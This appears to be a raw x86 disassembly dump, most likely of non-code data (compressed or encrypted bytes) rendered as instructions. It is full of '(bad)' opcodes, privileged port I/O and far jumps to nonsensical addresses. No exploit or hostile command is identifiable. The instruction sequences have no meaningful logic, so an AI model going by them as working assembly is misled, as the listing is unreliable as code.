  426859:	add    bh,BYTE PTR [edi+0x73703c9b]
  42685f:	jmp    0x4268cb
  426861:	pop    eax
  426862:	and    esp,DWORD PTR [edx+0x71]
  426865:	rcl    DWORD PTR [edx-0x56],0x63
  426869:	xor    eax,0x84ef7af9
  42686e:	mov    eax,ds:0xcab9a09a
  426873:	or     eax,0x835c84c2
  426878:	fidiv  DWORD PTR [edx]
  42687a:	leave  
  42687b:	les    ebp,FWORD PTR [edx]
  42687d:	hlt    
  42687e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42687f:	xor    ebx,ebp
  426881:	fwait
  426882:	test   al,0x86
  426884:	xchg   ebp,eax
  426885:	stc    
  426886:	push   ebx
  426887:	fdivr  DWORD PTR [ebx-0x7de75621]
  42688d:	jae    0x426862
  42688f:	ficom  DWORD PTR [ebx+0x18]
  426892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426893:	mov    dl,0x31
  426895:	mov    ecx,0x9762dff
  42689a:	mov    ds:0xa89d73ad,eax
  42689f:	hlt    
  4268a0:	rol    BYTE PTR [esi+0x3a11b653],0x1c
  4268a7:	cwde   
  4268a8:	jnp    0x426914
  4268aa:	int3   
  4268ab:	mov    ds,esp
  4268ad:	ss xchg ecx,eax
  4268af:	stos   BYTE PTR es:[edi],al
  4268b0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4268b2:	pop    ds
  4268b3:	dec    ecx
  4268b4:	fild   WORD PTR [eax]
	...
  426916:	mov    WORD PTR [esi+0x7d],cs
  426919:	jge    0x42691a
  42691b:	jg     0x4268a9
  42691d:	jmp    FWORD PTR [esi]
  42691f:	out    0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	adc    edx,DWORD PTR [edi+0x1a]
  426925:	jge    0x426985
  426927:	fwait
  426928:	add    DWORD PTR [eax],eax
  42692a:	pop    es
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    BYTE PTR [esi],al
  42692f:	mov    dl,BYTE PTR [ecx+0x2b]
  426932:	mov    BYTE PTR ds:0x3aa25cad,dl
  426938:	push   esi
  426939:	sbb    DWORD PTR [edi-0x68],edx
  42693c:	addr16 cmc 
  42693e:	(bad)  
  42693f:	cmp    al,0xdb
  426941:	jbe    0x4269ba
  426943:	aaa    
  426944:	sbb    edx,DWORD PTR [edi-0x23]
  426947:	icebp  
  426948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426949:	adc    BYTE PTR [ecx-0x6d],0x27
  42694d:	test   DWORD PTR [ebp-0x294b45c2],edx
  426953:	mov    WORD PTR [ebx+0x1f],es
  426956:	or     ebx,edx
  426958:	jo     0x426949
  42695a:	nop
  42695b:	pop    ss
  42695c:	push   edi
  42695d:	add    eax,0x7f5d1af6
  426962:	repz push esi
  426964:	push   0x60
  426966:	and    bl,BYTE PTR ds:0xe6d9f619
  42696c:	cmc    
  42696d:	adc    dh,al
  42696f:	das    
  426970:	push   cs
  426971:	inc    ecx
  426972:	sub    ebp,ebp
  426974:	mov    edi,0x41a6a9bb
  426979:	out    dx,eax
  42697a:	mov    ebx,ecx
  42697c:	add    eax,0x4e55d74d
  426981:	out    0xd4,al
  426983:	adc    DWORD PTR [edx],edi
  426985:	in     al,0xd2
  426987:	inc    ebx
  426988:	adc    eax,0x88b73730
  42698d:	push   esi
  42698e:	xchg   esi,eax
  42698f:	xchg   esp,eax
  426990:	in     eax,dx
  426991:	test   al,0xdb
  426993:	retf   
  426994:	frstor ss:[ebx+0x70edd470]
  42699b:	in     al,dx
  42699c:	out    0xd9,al
  42699e:	pushf  
  42699f:	inc    esi
  4269a0:	lods   al,BYTE PTR ds:[esi]
  4269a1:	into   
  4269a2:	or     al,0x8
  4269a4:	inc    edx
  4269a5:	mov    esp,0x4850b80b
  4269aa:	push   DWORD PTR ds:0x395f25df
  4269b0:	aad    0xc6
  4269b2:	mov    dh,0x31
  4269b4:	addr16 jge 0x426967
  4269b7:	sahf   
  4269b8:	pop    ebx
  4269b9:	pop    ds
  4269ba:	xchg   esp,eax
  4269bb:	sub    DWORD PTR [edx-0x57ef33c6],esp
  4269c1:	sub    eax,0xa69e64dd
  4269c6:	pop    eax
  4269c7:	sub    edx,DWORD PTR [eax+0x22]
  4269ca:	or     al,0x80
  4269cc:	je     0x426991
  4269ce:	mov    edx,0x1bcf3f39
  4269d3:	fcmovnu st,st(5)
  4269d5:	mov    dl,0xcb
  4269d7:	sub    bh,BYTE PTR [ebx+0x1a224842]
  4269dd:	xor    DWORD PTR [eax-0x32f3ed3d],eax
  4269e3:	and    esp,DWORD PTR [edx]
  4269e5:	push   ecx
  4269e6:	call   0xfa03e6b2
  4269eb:	mov    WORD PTR [ebp-0x3],?
  4269ee:	out    dx,al
  4269ef:	mul    BYTE PTR [ecx+0x7c]
  4269f2:	je     0x42698f
  4269f4:	cmp    BYTE PTR [edx],bh
  4269f6:	xchg   esp,eax
  4269f7:	xlat   BYTE PTR ds:[ebx]
  4269f8:	pop    ebx
  4269f9:	js     0x426a45
  4269fb:	retf   0xcf82
  4269fe:	adc    cl,bh
  426a00:	(bad)  
  426a01:	mov    ch,0x37
  426a03:	pop    ecx
  426a04:	imul   esi,DWORD PTR [edx-0x6a],0xc32ca886
  426a0b:	test   DWORD PTR ds:0xc8f81603,0xf6f9aee5
  426a15:	add    bl,0x81
  426a18:	add    DWORD PTR [eax+ecx*2],0xffffffe5
  426a1c:	sbb    edx,DWORD PTR [ecx]
  426a1e:	mov    ebx,0x9f21b480
  426a23:	add    edx,DWORD PTR [ecx-0x568c3453]
  426a29:	faddp  st(1),st
  426a2b:	push   ebx
  426a2c:	in     eax,dx
  426a2d:	adc    ecx,DWORD PTR [edi]
  426a2f:	pop    ss
  426a30:	mov    ah,0x39
  426a32:	or     DWORD PTR [edx],eax
  426a34:	adc    eax,DWORD PTR [eax]
	...
  426a96:	cdq    
  426a97:	sub    BYTE PTR ds:0xdb77bd56,cl
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	push   esi
  426aa3:	imul   ebp,DWORD PTR [ebp+0x1e],0x19c65
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    BYTE PTR [ebx+edi*1-0x30],dh
  426ab1:	fsub   QWORD PTR [ecx-0xf6351f7]
  426ab7:	call   0x64c8f34b
  426abc:	push   ebx
  426abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426abe:	retf   0x558d
  426ac1:	loope  0x426ae3
  426ac3:	cld    
  426ac4:	retf   0xf6e4
  426ac7:	xchg   esp,eax
  426ac8:	call   0x80ba:0xb9914613
  426acf:	mov    bl,0xad
  426ad1:	pop    esi
  426ad2:	dec    ecx
  426ad3:	in     eax,dx
  426ad4:	int    0xf
  426ad6:	jnp    0x426b0a
  426ad8:	stos   BYTE PTR es:[edi],al
  426ad9:	daa    
  426ada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426adb:	and    BYTE PTR [ebx],bl
  426add:	fcom   DWORD PTR [edi+0x42]
  426ae0:	std    
  426ae1:	or     BYTE PTR [ecx+0x1e18ff63],cl
  426ae7:	inc    edx
  426ae8:	leave  
  426ae9:	je     0x426adf
  426aeb:	adc    edi,DWORD PTR [esi+0x51]
  426aee:	out    0x78,eax
  426af0:	inc    edx
  426af1:	jno    0x426b24
  426af3:	in     al,dx
  426af4:	fs mov al,0x99
  426af7:	jg     0x426ac6
  426af9:	test   BYTE PTR ds:0xff667b25,bh
  426aff:	adc    al,0x75
  426b01:	mov    ds:0x16fa31a0,eax
  426b06:	sti    
  426b07:	push   esp
  426b08:	inc    ebx
  426b09:	in     al,dx
  426b0a:	(bad)  
  426b0b:	in     al,dx
  426b0c:	and    esi,ebx
  426b0e:	ret    
  426b0f:	repnz aaa 
  426b11:	mov    edx,0x83f58e32
  426b16:	out    dx,eax
  426b17:	imul   ebx,DWORD PTR [eax],0x51
  426b1a:	repnz add al,0x74
  426b1d:	fistp  QWORD PTR [edx+0x15e02094]
  426b23:	mov    esp,0xb116466c
  426b28:	imul   esi,ebp,0x5a
  426b2b:	dec    edi
  426b2c:	sub    bl,BYTE PTR [edi+0x31de70bd]
  426b32:	and    eax,0x9f75f05
  426b37:	nop
  426b38:	test   DWORD PTR [ebx+ebx*1+0x2a],0xd6916a4e
  426b40:	in     eax,0x98
  426b42:	inc    esp
  426b43:	jnp    0x426b8b
  426b45:	xor    eax,0x4ea9d9c6
  426b4a:	mov    ebx,DWORD PTR [ecx]
  426b4c:	xor    DWORD PTR [edx],eax
  426b4e:	test   BYTE PTR [edi-0x71],ch
  426b51:	loop   0x426b80
  426b53:	inc    ecx
  426b54:	add    al,0xbc
  426b56:	jno    0x426b59
  426b58:	cwde   
  426b59:	ror    DWORD PTR [ecx+0x44],0x1
  426b5d:	xchg   BYTE PTR [eax-0x6ca31391],bl
  426b63:	jae    0x426b05
  426b65:	dec    eax
  426b66:	push   es
  426b67:	sub    eax,0x463e5b6c
  426b6c:	(bad)  
  426b6d:	rol    DWORD PTR [ecx+0x103f2ab8],0x6e
  426b74:	inc    edx
  426b75:	ror    BYTE PTR [ebp-0x697e96e3],cl
  426b7b:	mov    ch,0x96
  426b7d:	sub    ah,BYTE PTR [edx]
  426b7f:	jmp    DWORD PTR [ebp+0x3327509b]
  426b85:	push   ds
  426b86:	dec    edx
  426b87:	mov    ?,WORD PTR [esi-0x41]
  426b8a:	inc    esi
  426b8b:	add    eax,0xa60d077d
  426b90:	test   BYTE PTR [ebp+ecx*4-0x124b4146],0x41
  426b98:	jl     0x426bcf
  426b9a:	call   0xa65e3305
  426b9f:	or     eax,0x1e62ee10
  426ba4:	fild   DWORD PTR ds:0xb89b7035
  426baa:	mov    ch,0xfc
  426bac:	not    cl
  426bae:	mov    cs,WORD PTR [ebp-0x38a7b09]
  426bb4:	mov    al,BYTE PTR [eax]
	...
  426c16:	loop   0x426c78
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	(bad)  
  426c23:	push   ebx
  426c24:	rol    esp,cl
  426c26:	ins    BYTE PTR es:[edi],dx
  426c27:	popf   
  426c28:	add    DWORD PTR [eax],eax
  426c2a:	pop    es
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    BYTE PTR [ecx+0x65],al
  426c30:	es sub eax,0xf83f6d5e
  426c36:	call   0x66f47fb
  426c3b:	mov    ecx,0xb39e16a8
  426c40:	les    esi,FWORD PTR [edi+0x3d1edb3b]
  426c46:	jno    0x426c91
  426c48:	es in  al,dx
  426c4a:	sub    eax,0xf163ace3
  426c4f:	pop    eax
  426c50:	mov    bh,0xf9
  426c52:	(bad)  
  426c53:	sub    ebp,DWORD PTR [edi]
  426c55:	repnz or eax,0xaef07c01
  426c5b:	jne    0x426c9d
  426c5d:	mov    ds:0xd4ec8837,eax
  426c62:	ja     0x426c02
  426c64:	cmp    dl,dh
  426c66:	mov    ebp,DWORD PTR [ecx+0x9976e8]
  426c6c:	or     edi,DWORD PTR [edx+ebx*1-0x77]
  426c70:	or     eax,0x9f170139
  426c75:	fs sub cl,ah
  426c78:	adc    al,0x2
  426c7a:	ds popf 
  426c7c:	out    dx,eax
  426c7d:	je     0x426cd5
  426c7f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  426c81:	lahf   
  426c82:	loop   0x426cae
  426c84:	jmp    0x740fc7d7
  426c89:	outs   dx,DWORD PTR ds:[esi]
  426c8a:	sahf   
  426c8b:	mov    ah,0x60
  426c8d:	lahf   
  426c8e:	sbb    DWORD PTR [edi],esi
  426c90:	pusha  
  426c91:	pop    ebx
  426c92:	add    eax,0xf2db3449
  426c97:	cmp    DWORD PTR [edx],edi
  426c99:	mov    ebx,0x9ced1c2f
  426c9e:	test   al,0xa4
  426ca0:	adc    esp,DWORD PTR [ecx+0x52d53274]
  426ca6:	jns    0x426c73
  426ca8:	scas   al,BYTE PTR es:[edi]
  426ca9:	pushf  
  426caa:	dec    ebp
  426cab:	sub    ecx,esp
  426cad:	pop    ebp
  426cae:	lods   al,BYTE PTR ds:[esi]
  426caf:	xlat   BYTE PTR gs:[ebx]
  426cb1:	clc    
  426cb2:	dec    edi
  426cb3:	aaa    
  426cb4:	inc    ecx
  426cb6:	and    al,0x49
  426cb8:	mov    cl,0x2a
  426cba:	scas   eax,DWORD PTR es:[edi]
  426cbb:	and    BYTE PTR [esp],0xb8
  426cbf:	cmp    BYTE PTR [esi],bl
  426cc1:	fcom   DWORD PTR [esi]
  426cc3:	cwde   
  426cc4:	xchg   edi,eax
  426cc5:	or     DWORD PTR [eax-0x46],eax
  426cc8:	pop    edi
  426cc9:	shr    DWORD PTR [eax+0x37],cl
  426ccc:	sub    dl,ah
  426cce:	adc    BYTE PTR [ecx],dh
  426cd0:	cmc    
  426cd1:	in     al,dx
  426cd2:	mov    ebp,0x2f60baef
  426cd7:	mov    eax,fs:0x6cb2f9af
  426cdd:	lahf   
  426cde:	fs add eax,0x39e9d6a3
  426ce4:	mov    ?,esi
  426ce6:	rcr    BYTE PTR [ecx],cl
  426ce8:	loope  0x426cd7
  426cea:	push   ds
  426ceb:	in     eax,0x41
  426ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cee:	shl    BYTE PTR [esi+0x37],cl
  426cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426cf2:	xchg   edi,eax
  426cf3:	xchg   edx,eax
  426cf4:	imul   esp,DWORD PTR [esi],0xc95f60bf
  426cfa:	jp     0x426cf4
  426cfc:	js     0x426cdf
  426cfe:	loope  0x426ce3
  426d00:	and    bh,0x56
  426d03:	push   0xffffffe8
  426d05:	sub    eax,0x8516adc9
  426d0a:	pop    eax
  426d0b:	(bad)  
  426d0c:	mov    bh,0x8c
  426d0e:	lea    edx,[ecx-0x29]
  426d11:	loop   0x426d3a
  426d13:	xor    al,0x5c
  426d15:	cs jg  0x426d20
  426d18:	mov    WORD PTR [ebx-0x27],?
  426d1b:	fist   DWORD PTR [eax]
  426d1d:	cli    
  426d1e:	mov    ds:0xfa3ad38e,eax
  426d23:	push   ds
  426d24:	ja     0x426d85
  426d26:	pop    esp
  426d27:	rol    BYTE PTR [ebp+0x42],0xae
  426d2b:	xor    al,0xd6
  426d2d:	add    al,0xd8
  426d2f:	lods   eax,DWORD PTR ds:[esi]
  426d30:	add    ecx,DWORD PTR [esi-0x53]
  426d33:	in     al,0xc5
	...
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0x6787:0x7e1b1bf9
  426da3:	rol    bh,0x7b
  426da6:	jae    0x426d46
  426da8:	add    DWORD PTR [eax],eax
  426daa:	pop    es
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    BYTE PTR [edi],dl
  426daf:	add    eax,0xd8abf352
  426db4:	enter  0xc17c,0xc2
  426db8:	pushf  
  426db9:	popa   
  426dba:	cmp    dl,BYTE PTR [ecx-0x1207131b]
  426dc0:	stc    
  426dc1:	mov    dl,0x4
  426dc3:	loope  0x426de2
  426dc5:	in     eax,0x8d
  426dc7:	fs dec ebp
  426dc9:	repnz dec ebx
  426dcb:	imul   ebx,ebx,0xcb28353c
  426dd1:	(bad)  
  426dd2:	cwde   
  426dd3:	aam    0x64
  426dd5:	push   ebx
  426dd6:	in     al,0xde
  426dd8:	cli    
  426dd9:	fidivr WORD PTR [edi-0x6ba90757]
  426ddf:	jb     0x426d6b
  426de1:	out    dx,eax
  426de2:	faddp  st(5),st
  426de4:	or     al,0x27
  426de6:	std    
  426de7:	imul   edi,edi,0x1b0231ba
  426ded:	inc    ecx
  426dee:	inc    eax
  426def:	mov    ebp,0x13994a46
  426df4:	jno    0x426e1e
  426df6:	ficomp WORD PTR [ecx]
  426df8:	mov    cl,0xb
  426dfa:	push   cs
  426dfb:	retf   0xcb16
  426dfe:	je     0x426db6
  426e00:	mov    ch,0x91
  426e02:	sub    al,0x9e
  426e04:	add    eax,0x89710ba2
  426e09:	aad    0x69
  426e0b:	ror    DWORD PTR [ecx-0x309131c6],0xe4
  426e12:	mov    esp,0xa5d0a598
  426e17:	fwait
  426e18:	popa   
  426e19:	clc    
  426e1a:	xchg   esp,eax
  426e1b:	or     cl,BYTE PTR [edi]
  426e1d:	es and dl,ah
  426e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e21:	scas   eax,DWORD PTR es:[edi]
  426e22:	and    BYTE PTR [ebp+0x29],0x23
  426e26:	sahf   
  426e27:	push   0x14
  426e29:	add    ebx,edx
  426e2b:	imul   edi
  426e2d:	cs lock add edi,esp
  426e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e32:	mov    eax,ds:0x323e7fd
  426e37:	ret    
  426e38:	mov    BYTE PTR [edi-0xad401c2],al
  426e3e:	ins    DWORD PTR es:[edi],dx
  426e3f:	cld    
  426e40:	outs   dx,BYTE PTR ds:[esi]
  426e41:	jg     0x426e4a
  426e43:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e45:	sub    DWORD PTR [esi-0x15],ecx
  426e48:	rcr    DWORD PTR [ebp-0x1c],0xef
  426e4c:	add    bl,al
  426e4e:	icebp  
  426e4f:	jae    0x426e7b
  426e51:	int    0x5f
  426e53:	jae    0x426e89
  426e55:	rol    BYTE PTR [ebx+0x6234999],0x45
  426e5c:	cmp    esi,DWORD PTR [esi-0x54a91806]
  426e62:	in     al,0xf
  426e64:	push   0x7
  426e66:	xchg   edx,eax
  426e67:	jle    0x426e0c
  426e69:	sub    eax,0x6df34873
  426e6e:	cmp    edi,ebx
  426e70:	mov    edx,0x7d7d4abc
  426e75:	mov    esi,0xa014886d
  426e7a:	mov    eax,ds:0x3a2beebb
  426e7f:	ds push ebx
  426e81:	sbb    al,0x9d
  426e83:	pop    edi
  426e84:	xchg   edx,eax
  426e85:	aad    0xc4
  426e87:	inc    eax
  426e88:	bound  ecx,QWORD PTR [esi]
  426e8a:	sbb    eax,0x97596b2f
  426e8f:	aad    0x8a
  426e91:	push   ebp
  426e92:	jp     0x426eac
  426e94:	xchg   esi,eax
  426e95:	mov    al,ds:0x1947692c
  426e9a:	fcom   QWORD PTR [edx+ebx*1]
  426e9d:	inc    ebx
  426e9e:	sbb    al,0x6
  426ea0:	test   eax,0xee3e0cac
  426ea5:	mov    WORD PTR [eax+0x644ec352],ss
  426eab:	xchg   ebx,eax
  426eac:	test   BYTE PTR [edi-0x3d192269],0xeb
  426eb3:	cmp    bl,0x0
	...
  426f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f17:	mov    ds:0xf5c7f1c7,al
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx-0xf73e65c],ch
  426f25:	(bad)  
  426f26:	jp     0x426ec7
  426f28:	add    DWORD PTR [eax],eax
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    BYTE PTR ds:0x6c20e4a0,ah
  426f33:	dec    edx
  426f34:	jne    0x426f91
  426f36:	lock fmul st(5),st
  426f39:	fs pop ebx
  426f3b:	repz push 0xffffff8d
  426f3e:	int    0xfd
  426f40:	test   ebx,eax
  426f42:	mov    edx,DWORD PTR [ecx+esi*4-0x63]
  426f46:	adc    ebx,eax
  426f48:	mov    edx,edx
  426f4a:	repnz and bl,dh
  426f4d:	fisub  DWORD PTR [ebx+0x128828c4]
  426f53:	dec    edi
  426f54:	gs dec esi
  426f56:	mov    ebx,0xd608deef
  426f5b:	xor    eax,0x29aa1065
  426f60:	icebp  
  426f61:	mov    esi,0xaf734a17
  426f66:	mov    cl,0xad
  426f68:	add    bl,BYTE PTR [ecx]
  426f6a:	outs   dx,BYTE PTR ds:[esi]
  426f6b:	xor    al,0xee
  426f6d:	sub    al,0xca
  426f6f:	pop    ebx
  426f70:	mov    BYTE PTR [edx+0x7ef447ad],ah
  426f76:	call   0xc986:0xb1d24fdb
  426f7d:	pop    ebp
  426f7e:	loopne 0x426f34
  426f80:	lds    ecx,FWORD PTR [ebp+0x7af75156]
  426f86:	in     al,0xc1
  426f88:	mov    ebx,0x12c24642
  426f8d:	rcr    BYTE PTR [ecx-0x34],0x47
  426f91:	pop    ds
  426f92:	jne    0x426f54
  426f94:	jae    0x426f19
  426f96:	cld    
  426f97:	add    al,0xb2
  426f99:	mov    esp,0xbfa7e7df
  426f9e:	pushw  ss
  426fa0:	inc    esi
  426fa1:	cwde   
  426fa2:	fnstenv [edi+0x501fe71a]
  426fa8:	mov    ds:0x41310921,eax
  426fad:	es out dx,al
  426faf:	addr16 (bad) 
  426fb1:	fst    QWORD PTR [ebp-0x2a292204]
  426fb7:	or     ecx,ebx
  426fb9:	push   cs
  426fba:	ja     0x426f4f
  426fbc:	inc    esi
  426fbd:	mov    edx,0x564a2d1a
  426fc2:	fwait
  426fc3:	jae    0x427040
  426fc5:	add    DWORD PTR [eax+0x39],0xf
  426fc9:	ins    BYTE PTR es:[edi],dx
  426fca:	in     eax,0xa5
  426fcc:	aad    0x56
  426fce:	mov    dh,0x67
  426fd0:	clc    
  426fd1:	jl     0x426fed
  426fd3:	aam    0x95
  426fd5:	jle    0x426f6b
  426fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd8:	inc    edx
  426fd9:	shr    esp,0xe7
  426fdc:	push   ds
  426fdd:	inc    ebp
  426fde:	dec    edi
  426fdf:	ficomp DWORD PTR [edi+0x38622868]
  426fe5:	imul   ecx,DWORD PTR [ecx],0x77b69b6e
  426feb:	leave  
  426fec:	sbb    eax,0xd74e27ca
  426ff1:	aas    
  426ff2:	push   edx
  426ff3:	push   cs
  426ff4:	sub    al,0x5e
  426ff7:	xchg   ecx,eax
  426ff8:	xor    cl,dh
  426ffa:	jecxz  0x427007
  426ffc:	dec    edx
  426ffd:	rol    cl,cl
  426fff:	mov    esp,ecx
  427001:	and    al,0x84
  427003:	cmp    eax,0x33d9ca08
  427008:	or     eax,0x1faab2e
  42700d:	sub    BYTE PTR [eax-0x6637a901],0x58
  427014:	and    dl,bh
  427016:	les    eax,FWORD PTR [ebx+0x1f]
  427019:	push   es
  42701a:	jmp    0xb55a187e
  42701f:	xchg   ecx,eax
  427020:	call   0x4c7:0xb03e48dc
  427027:	sub    ebp,DWORD PTR ss:[edi]
  42702a:	xchg   esi,eax
  42702b:	mov    ebx,0xc523da29
  427030:	fucom  st(2)
  427032:	pusha  
  427033:	lea    eax,[edi+0x0]
	...
  427095:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42709c:	(bad)  
  42709d:	std    
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax-0x28a71a3a],eax
  4270a5:	sub    eax,DWORD PTR [ecx+0x70001a0]
  4270ab:	add    DWORD PTR [eax],eax
  4270ad:	add    BYTE PTR [esi-0x2e6d6d57],dl
  4270b3:	mov    ds:0xca2fa077,al
  4270b8:	outs   dx,BYTE PTR ds:[esi]
  4270b9:	sbb    eax,0x9c93966e
  4270be:	lods   al,BYTE PTR ds:[esi]
  4270bf:	addr16 xor eax,0xbbafef2c
  4270c5:	sbb    esi,DWORD PTR [edi+0x53c47dc7]
  4270cb:	fisub  WORD PTR [ecx]
  4270cd:	ins    BYTE PTR es:[edi],dx
  4270ce:	jbe    0x427052
  4270d0:	test   eax,0x5e35121a
  4270d5:	(bad)  
  4270d6:	int    0x71
  4270d8:	js     0x427133
  4270da:	cld    
  4270db:	cmp    bh,ch
  4270dd:	add    eax,0xf7db6cdc
  4270e2:	or     eax,0x47d15887
  4270e7:	mov    WORD PTR [ebx],fs
  4270e9:	(bad)  
  4270ea:	pop    edx
  4270eb:	fwait
  4270ec:	out    dx,al
  4270ed:	nop
  4270ee:	add    eax,0xa3f98505
  4270f3:	lods   eax,DWORD PTR ds:[esi]
  4270f4:	int    0x8e
  4270f6:	pop    esp
  4270f7:	dec    ebp
  4270f8:	out    dx,eax
  4270f9:	shr    esp,1
  4270fb:	fld    QWORD PTR [esi+ebx*2+0x31]
  4270ff:	mov    esp,0xf3adb18e
  427104:	xchg   edi,eax
  427105:	adc    eax,DWORD PTR [esi-0x6b]
  427108:	mov    esi,0xd4bafbf3
  42710d:	imul   ebp,DWORD PTR [edi+0x60],0xffffffad
  427111:	enter  0x6368,0xf8
  427115:	xor    edx,DWORD PTR [edx-0x12d77af1]
  42711b:	pushf  
  42711c:	addr16 jbe 0x427108
  42711f:	pop    eax
  427120:	push   ebx
  427121:	jae    0x4270d9
  427123:	cdq    
  427124:	cmp    DWORD PTR [ebx-0x43f000ed],esi
  42712a:	xchg   BYTE PTR [edx+0x1eee1866],bl
  427130:	mov    cl,0xa4
  427132:	hlt    
  427133:	or     BYTE PTR [ebx],dl
  427135:	add    edi,DWORD PTR [edx+0x1f787f1a]
  42713b:	pop    eax
  42713c:	dec    edx
  42713d:	stos   DWORD PTR es:[edi],eax
  42713e:	jne    0x4270d5
  427140:	push   ds
  427141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427142:	xchg   ebp,eax
  427143:	or     al,0x97
  427145:	popf   
  427146:	jl     0x427182
  427148:	mov    WORD PTR cs:[esi-0x3941910c],?
  42714f:	test   BYTE PTR [edx+0x3d],bh
  427152:	cmc    
  427153:	mov    ecx,0x62797755
  427158:	jg     0x4270fa
  42715a:	inc    ebx
  42715b:	fsub   QWORD PTR [ebx]
  42715d:	div    BYTE PTR [eax]
  42715f:	int    0x60
  427161:	add    al,0xa9
  427163:	xor    eax,0x34ecf822
  427168:	cmp    dh,BYTE PTR [ebx]
  42716a:	push   es
  42716b:	and    ecx,DWORD PTR [ebx-0x3f7e90f3]
  427171:	in     eax,0x55
  427173:	xor    al,0x99
  427175:	repz fwait
  427177:	test   ebx,ebp
  427179:	je     0x42716d
  42717b:	mov    ecx,0xf9f2bd15
  427180:	nop
  427181:	sbb    al,0x75
  427183:	popa   
  427184:	cmp    BYTE PTR [edi+ebp*2+0x3f],0x0
  427189:	arpl   bx,ax
  42718b:	lahf   
  42718c:	xor    ch,BYTE PTR [edx]
  42718e:	jne    0x427181
  427190:	(bad)
  427193:	cmp    eax,0x64fb2138
  427198:	and    eax,0xed14656f
  42719d:	inc    eax
  42719e:	int3   
  42719f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271a0:	xchg   ecx,eax
  4271a1:	cmp    bl,ah
  4271a3:	fdiv   DWORD PTR [eax]
  4271a5:	inc    esp
  4271a6:	inc    edx
  4271a7:	jbe    0x427199
  4271a9:	lods   eax,DWORD PTR ds:[esi]
  4271aa:	outs   dx,BYTE PTR ds:[esi]
  4271ab:	add    edx,DWORD PTR [ecx+0x54]
  4271ae:	mov    ds:0xec4573fc,eax
  4271b3:	sti    
  4271b4:	add    BYTE PTR es:[eax],al
	...
  427213:	add    BYTE PTR [eax],al
  427215:	add    BYTE PTR [esi],bl
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x229d0100
  427224:	fist   WORD PTR [eax+ecx*4+0x70001a1]
  42722b:	add    DWORD PTR [eax],eax
  42722d:	add    cl,bh
  42722f:	mov    al,cs:0x84d54139
  427235:	and    BYTE PTR [eax],bh
  427237:	mov    ebx,0xc7da772b
  42723c:	(bad)  
  42723d:	jo     0x42722c
  42723f:	pop    ss
  427240:	pop    eax
  427241:	rcl    ah,0xf4
  427244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427245:	mov    dl,0xf0
  427247:	and    eax,0x59fa054a
  42724c:	mov    dl,0x8b
  42724e:	adc    cl,BYTE PTR [eax]
  427250:	out    dx,eax
  427251:	or     esp,edi
  427253:	call   DWORD PTR [eax+ebx*8+0x7a]
  427257:	add    BYTE PTR [eax],ah
  427259:	sahf   
  42725a:	pop    esp
  42725b:	pop    ebp
  42725c:	sar    DWORD PTR [ecx+0x9],cl
  42725f:	jmp    0xed15c48
  427264:	jbe    0x4272e1
  427266:	or     DWORD PTR [esi+0x706ea867],eax
  42726c:	shl    cl,cl
  42726e:	sbb    DWORD PTR [ebp-0x3a024722],eax
  427274:	mov    al,0x92
  427276:	bound  esi,QWORD PTR ds:0x12cabf85
  42727c:	call   0x845c:0xa788de19
  427283:	add    bh,al
  427285:	fld    TBYTE PTR [edi+0x3a]
  427288:	mov    eax,ds:0x7d74b6cc
  42728d:	push   ds
  42728e:	test   al,0xd9
  427290:	mov    eax,0xd450360b
  427295:	outs   dx,BYTE PTR ds:[esi]
  427296:	and    eax,0x2f6d0313
  42729b:	jl     0x427263
  42729d:	sub    edx,DWORD PTR [eax+0x3f8095ac]
  4272a3:	hlt    
  4272a4:	rcr    DWORD PTR [edi-0x5b7ff7ca],1
  4272aa:	mov    cl,0x94
  4272ac:	pop    es
  4272ad:	cli    
  4272ae:	push   es
  4272af:	and    al,0x4d
  4272b1:	push   0xffffffb8
  4272b3:	scas   al,BYTE PTR es:[edi]
  4272b4:	in     al,0xd
  4272b6:	mov    ah,BYTE PTR [edi]
  4272b8:	pop    esi
  4272b9:	jl     0x427306
  4272bb:	(bad)  [ebx+0x4e]
  4272be:	jmp    0x24443a97
  4272c3:	add    ebp,DWORD PTR [ebx]
  4272c5:	add    bl,BYTE PTR [esi-0x80]
  4272c8:	mov    esi,0x62100c44
  4272cd:	jmp    0x6718:0xef9e14f0
  4272d4:	xor    dh,BYTE PTR [ebx-0x76]
  4272d7:	adc    bh,bh
  4272d9:	inc    ebp
  4272da:	(bad)  
  4272db:	jmp    0x4272e7
  4272dd:	push   edi
